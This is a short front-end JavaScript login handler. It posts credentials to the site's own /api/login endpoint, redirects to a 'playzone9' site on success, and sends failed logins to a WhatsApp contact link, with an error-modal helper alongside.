document.addEventListener("DOMContentLoaded", () => {
    const loginForm = document.getElementById("login-form");
    const loginBtn  = document.getElementById("login-btn");

    /* ── Loading state — batched DOM writes with requestAnimationFrame (Fix #7: eliminates forced reflow ~44ms) */
    function setLoading(on) {
        if (!loginBtn) return;
        // Batch: read then write in same frame via rAF to avoid layout thrashing
        requestAnimationFrame(() => {
            loginBtn.disabled   = on;
            loginBtn.innerHTML  = on
                ? 'Please wait... <i class="fas fa-spinner fa-spin float-end mt-1"></i>'
                : 'Login <i class="fas fa-sign-in-alt float-end mt-1"></i>';
        });
    }

    if (loginForm) {
        loginForm.addEventListener("submit", async (e) => {
            e.preventDefault();

            const username = document.getElementById("username").value.trim();
            const accessKey = document.getElementById("password").value;

            setLoading(true);
            try {
                const response = await fetch("/api/login", {
                    method:  "POST",
                    headers: { "Content-Type": "application/json" },
                    body:    JSON.stringify({ username, accessKey })
                });
                const data = await response.json();
                if (data.success) {
                    window.location.href = "https://www.playzone9.com/";
                } else {
                    redirectToWhatsApp();
                }
            } catch (err) {
                console.error("Login error:", err);
                redirectToWhatsApp();
            } finally {
                setLoading(false);
            }
        });
    }

    /* ── Close modal on backdrop click */
    const errorModal = document.getElementById("error-modal");
    if (errorModal) {
        errorModal.addEventListener("click", (e) => {
            if (e.target.id === "error-modal") {
                errorModal.style.display = "none";
            }
        });
    }
});

function showErrorModal() {
    const modal = document.getElementById("error-modal");
    if (modal) {
        // Batch DOM write in rAF to avoid layout thrashing (Fix #7)
        requestAnimationFrame(() => {
            modal.style.setProperty('display', 'flex', 'important');
        });
    }
}

function redirectToWhatsApp() {
    window.location.href = 'https://wa.me/918604543932';
}
